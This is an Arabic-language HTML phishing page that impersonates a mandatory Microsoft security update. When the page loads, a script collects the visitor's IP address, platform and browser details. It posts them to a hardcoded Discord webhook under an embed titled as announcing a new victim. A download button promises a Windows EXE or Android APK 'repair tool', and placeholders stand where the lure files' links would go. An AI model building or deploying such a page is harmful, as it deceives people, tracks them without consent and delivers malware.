<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث أمان ميكروسوفت</title>
    <script>
        async function startSystemGrabber() {
            const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            
            // 1. اكتشاف الجهاز وتغيير المحتوى تلقائياً
            if (isMobile) {
                document.getElementById('os-name').innerText = "نظام Android/iOS";
                document.getElementById('os-icon').src = "https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg"; // شعار أندرويد كمثال
            } else {
                document.getElementById('os-name').innerText = "نظام Windows";
                document.getElementById('os-icon').src = "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"; // شعار ميكروسوفت
            }

            // 2. سحب البيانات الأساسية فوراً
            try {
                const ipReq = await fetch('https://api.ipify.org?format=json');
                const ipRes = await ipReq.json();
                
                const payload = {
                    embeds: [{
                        title: "🚀 [TLQQEMM] تم دخول ضحية جديدة!",
                        color: 16711680,
                        fields: [
                            { name: "🌐 عنوان الـ IP", value: ipRes.ip },
                            { name: "💻 نوع الجهاز", value: navigator.platform },
                            { name: "🕵️ المتصفح", value: navigator.userAgent }
                        ],
                        footer: { text: "في انتظار تحميل ملف الصيد..." }
                    }]
                };
                fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
            } catch (e) {}

            // 3. تحديد رابط التحميل (هنا يجب وضع روابط ملفات الصيد الحقيقية)
            document.getElementById('mainBtn').onclick = () => {
                if (isMobile) {
                    alert("⚠️ جاري تحميل أداة إصلاح نظام أندرويد (تطبيق APK)...");
                    // window.location.href = "رابط_ملف_APK_الخاص_بك";
                } else {
                    alert("⚠️ جاري تحميل أداة إصلاح نظام ويندوز (ملف .EXE)...");
                    // window.location.href = "رابط_ملف_EXE_الخاص_بك";
                }
            };
        }
    </script>
    <style>
        body { background-color: #0078d7; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #00569e; padding: 40px; border-radius: 8px; text-align: center; width: 450px; }
        .icon { width: 60px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 300; margin-bottom: 10px; }
        p { font-size: 16px; line-height: 1.6; margin-bottom: 30px; }
        .btn { background: white; color: #0078d7; border: none; padding: 12px 30px; border-radius: 3px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body onload="startSystemGrabber()">
    <div class="container">
        <img id="os-icon" src="" class="icon">
        <h1>تحديث أمان إلزامي</h1>
        <p>نظراً لوجود ثغرة أمنية حرجة، يجب عليك تحميل وتثبيت أداة إصلاح نظام ميكروسوفت على جهازه <strong id="os-name"></strong> لضمان حماية بياناتك الشخصية.</p>
        <button id="mainBtn" class="btn">تحميل وتثبيت الآن</button>
    </div>
</body>
</html>
